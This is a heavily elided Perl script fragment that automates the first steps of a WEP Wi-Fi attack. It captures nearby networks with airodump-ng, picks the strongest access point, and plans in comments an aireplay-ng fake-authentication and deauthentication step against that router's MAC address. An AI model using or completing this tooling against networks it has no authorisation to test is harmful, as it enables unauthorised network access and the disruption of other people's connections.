...
print `timeout 120 airodump-ng --encrypt WEP mon0 -w wep.txt`;
print `timeout 120 airodump-ng mon0 -w wep.txt`;
...
foreach $line (<WEP>){
  ...
  @fullline = split(',', $line);
  $fullline[1] =~ s/^ *//;  #Remove Leading Spaces
  push(@sigstrength, $fullline[1]);
...
print `cat wep.out | grep -- $max > out2.txt`;
...
print "\n\@station: @station";
## get required info from the max line. looking for MAC for deauth



## aireplay-ng -1 0 -a <router mac> mon0



## this deauths
## if exit=0, then proceed.
